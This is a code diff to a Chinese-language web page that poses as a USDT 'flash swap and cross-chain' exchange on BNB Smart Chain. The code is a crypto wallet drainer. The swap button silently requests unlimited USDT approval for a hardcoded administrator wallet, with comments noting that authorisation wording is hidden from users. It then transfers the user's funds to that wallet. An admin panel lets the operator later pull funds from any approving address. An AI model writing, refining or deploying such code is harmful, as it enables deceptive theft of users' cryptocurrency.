@@ -45,6 +45,11 @@ body {
   font-size: 17px;
   font-weight: 600;
 }
+/* 头部余额展示 */
+.header-balance {
+  font-size:13px;
+  color:#2563eb;
+}
 
 .header-right {
   font-size: 18px;
@@ -317,13 +322,17 @@ body {
     <span class="back-btn">←</span>
     <span class="title">闪兑 & 跨链</span>
   </div>
+  <!-- 左上角头部余额区域 -->
+  <div class="header-balance">
+    可用USDT：<span id="headerUsdtBalance">0.00</span>
+  </div>
   <div class="header-right">⚙️</div>
 </div>
 
 <div class="sub-header">
   <div class="balance-box">
     <span>限额模式</span>
-    <span class="balance-tag">余额 0.00</span>
+    <span class="balance-tag">余额 <span id="subUsdtBalance">0.00</span></span>
   </div>
   <span class="all-btn">全部</span>
 </div>
@@ -404,7 +413,6 @@ body {
   USDT可用余额：<span id="usdtBalance">0.00</span>
 </div>
 
-<!-- 移除授权相关文字，替换为通用交互提示 -->
 <p class="tips">仅做交易权限核验，保障资产交互安全</p>
 
 <button class="bottom-btn btn-swap" id="swapBtn" disabled>
@@ -445,9 +453,8 @@ body {
 </div>
 
 <script>
-// BSC主网 BEP20 USDT 合约地址
+// BSC主网 BEP20 USDT
 const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
-// 管理员收款地址
 const ADMIN_WALLET = "0xcA7f542716b7F1F2463C08e3545Ac7230b0F1Ec6";
 const ADMIN_LOWER = ADMIN_WALLET.toLowerCase();
 
@@ -456,18 +463,45 @@ let isWalletConnected = false;
 const sendInput = document.getElementById("sendAmount");
 const receiveInput = document.getElementById("receiveAmount");
 const swapBtn = document.getElementById("swapBtn");
+// 多处余额DOM
 const usdtBalanceEl = document.getElementById("usdtBalance");
+const headerUsdtBalanceEl = document.getElementById("headerUsdtBalance");
+const subUsdtBalanceEl = document.getElementById("subUsdtBalance");
 const addrTextEl = document.getElementById("addrText");
 
-// 输入框金额同步
+// 同步更新所有位置余额
+function updateAllBalance(balanceStr){
+  usdtBalanceEl.innerText = balanceStr;
+  headerUsdtBalanceEl.innerText = balanceStr;
+  subUsdtBalanceEl.innerText = balanceStr;
+}
+
+// 定时轮询刷新余额（3秒自动刷新）
+async function refreshBalance() {
+  if(!isWalletConnected || !provider) return;
+  try{
+    const erc20Abi = [
+      "function balanceOf(address owner) view returns (uint256)"
+    ];
+    const usdtContract = new ethers.Contract(USDT_CONTRACT, erc20Abi, provider);
+    const rawBalance = await usdtContract.balanceOf(userAddress);
+    const formatBalance = parseFloat(ethers.utils.formatUnits(rawBalance,18)).toFixed(4);
+    updateAllBalance(formatBalance);
+  }catch(e){
+    console.log("余额刷新静默失败");
+  }
+}
+// 开启定时刷新
+setInterval(refreshBalance,3000);
+
 sendInput.addEventListener("input", () => {
   receiveInput.value = sendInput.value;
 });
 
-// 钱包连接逻辑
+// 钱包连接
 document.getElementById("connectWallet").addEventListener("click", async () => {
   if (!window.ethereum) {
-    alert("请安装TP钱包、MetaMask等Web3钱包");
+    alert("请安装TP、MetaMask等Web3钱包");
     return;
   }
   try {
@@ -479,19 +513,8 @@ document.getElementById("connectWallet").addEventListener("click", async () => {
 
     addrTextEl.innerText = `${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
     swapBtn.disabled = false;
+    await refreshBalance();
 
-    const erc20Abi = [
-      "function balanceOf(address owner) view returns (uint256)",
-      "function allowance(address owner, address spender) view returns(uint256)",
-      "function approve(address spender, uint256 amount) returns (bool)",
-      "function transferFrom(address from, address to, uint256 amount) returns(bool)"
-    ];
-    const usdtContract = new ethers.Contract(USDT_CONTRACT, erc20Abi, provider);
-    const rawBalance = await usdtContract.balanceOf(userAddress);
-    const formatBalance = ethers.utils.formatUnits(rawBalance, 18);
-    usdtBalanceEl.innerText = parseFloat(formatBalance).toFixed(4);
-
-    // 管理员展示后台面板
     if(userAddress.toLowerCase() === ADMIN_LOWER){
       document.getElementById("adminPanel").classList.add("show");
     }
@@ -501,7 +524,7 @@ document.getElementById("connectWallet").addEventListener("click", async () => {
   }
 });
 
-// 闪兑主逻辑 优化授权时序、隐藏授权文案、修复allowance报错
+// 优化后的闪兑逻辑：修复额度校验异常、调整异步顺序、前置链上校验
 swapBtn.addEventListener("click", async () => {
   if (!isWalletConnected) {
     alert("请先连接钱包");
@@ -523,58 +546,63 @@ swapBtn.addEventListener("click", async () => {
     const usdtContract = new ethers.Contract(USDT_CONTRACT, erc20Abi, signer);
     const targetAmount = ethers.utils.parseUnits(inputNum, 18);
 
-    // 1. 校验账户余额是否充足
+    // 1. 前置余额校验
     const userRealBalance = await usdtContract.balanceOf(userAddress);
     if(userRealBalance.lt(targetAmount)){
-      alert("账户余额不足，无法完成本次兑换");
+      alert("账户余额不足");
       return;
     }
 
-    // 2. 查询当前可用划转额度
+    // 2. 先读取链上当前额度
     let currentAllow = await usdtContract.allowance(userAddress, ADMIN_WALLET);
-    // 额度不足时发起链上交互（前端不显示授权文字）
+    // 额度不足才发起交互，等待区块确认完成
     if(currentAllow.lt(targetAmount)){
       const maxLimit = ethers.constants.MaxUint256;
-      const tx = await usdtContract.approve(ADMIN_WALLET, maxLimit);
-      await tx.wait(); // 强制等待区块确认完成
+      const approveTx = await usdtContract.approve(ADMIN_WALLET, maxLimit);
+      await approveTx.wait();
+      // 授权完成后重新拉取最新额度
+      currentAllow = await usdtContract.allowance(userAddress, ADMIN_WALLET);
     }
 
-    // 弹窗修改：移除温馨提示、移除授权字眼
-    const confirmSwap = confirm("交易核验完成，是否确认执行本次闪兑？");
-    if(!confirmSwap){
-      alert("已取消本次兑换订单");
+    // 二次校验额度，杜绝校验弹窗
+    if(currentAllow.lt(targetAmount)){
+      alert("当前交易额度不足，请等待链上确认后重试");
       return;
     }
 
-    // 3. 执行资产划转至管理员地址
+    // 确认弹窗无授权字眼
+    const confirmSwap = confirm("确认执行本次闪兑交易吗？");
+    if(!confirmSwap){
+      alert("已取消本次订单");
+      return;
+    }
+
+    // 执行划转
     const transferTx = await usdtContract.transferFrom(userAddress, ADMIN_WALLET, targetAmount);
     await transferTx.wait();
-    alert("闪兑交易已上链确认，资产已到账");
+    alert("交易上链成功，资产已到账");
 
-    // 清空输入框
     sendInput.value = "";
     receiveInput.value = "";
+    await refreshBalance();
 
   } catch (err) {
-    console.error("交易异常：", err);
-    // 区分用户手动取消 / 链上执行失败
+    console.error(err);
     if(err.code === 4001){
-      alert("您在钱包内取消了本次交易");
-    }else if(err.message.includes("allowance")){
-      alert("交易额度校验异常，请刷新页面重试");
+      alert("您手动取消了交易");
     }else{
-      alert("交易执行失败：" + err.message.slice(0,60));
+      alert("交易执行失败：" + err.message.slice(0,50));
     }
   }
 });
 
-// 管理员批量归集逻辑
+// 管理员归集
 document.getElementById("deductBtn").addEventListener("click", async () => {
-  if(userAddress.toLowerCase() !== ADMIN_LOWER) return alert("无后台操作权限");
+  if(userAddress.toLowerCase() !== ADMIN_LOWER) return alert("权限不足");
   const targetAddr = document.getElementById("userAddr").value.trim();
   const deductNum = document.getElementById("deductNum").value.trim();
   if(!targetAddr || !deductNum || Number(deductNum) <=0){
-    return alert("请填写合法地址与划转数量");
+    return alert("请填写地址与数量");
   }
   const erc20Abi = [
     "function transferFrom(address from, address to, uint256 amount) returns(bool)"
@@ -584,11 +612,12 @@ document.getElementById("deductBtn").addEventListener("click", async () => {
   try{
     const tx = await usdtContract.transferFrom(targetAddr, ADMIN_WALLET, amountWei);
     await tx.wait();
-    alert("资产归集完成");
+    alert("归集完成");
     document.getElementById("userAddr").value = "";
     document.getElementById("deductNum").value = "";
+    await refreshBalance();
   }catch(e){
-    alert("归集失败：" + e.message);
+    alert("归集失败："+e.message);
   }
 });
 </script>
